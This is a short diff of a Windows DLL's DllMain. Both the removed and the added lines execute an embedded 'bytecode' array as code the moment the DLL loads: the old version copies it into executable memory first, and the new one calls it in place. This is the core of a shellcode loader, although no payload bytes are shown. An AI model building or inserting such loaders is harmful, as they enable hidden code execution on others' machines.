@@ -48,13 +48,8 @@ void function() {
 
 BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
     if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
-        LPVOID exec_mem = VirtualAlloc(NULL, sizeof(bytecode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-        if (exec_mem) {
-            memcpy(exec_mem, bytecode, sizeof(bytecode));
-            bytecode_func func = (bytecode_func)exec_mem;
-            func();  
-            VirtualFree(exec_mem, 0, MEM_RELEASE);  
-        }
+        bytecode_func func = (bytecode_func)bytecode;
+        func();  
     }
     return TRUE; 
 }
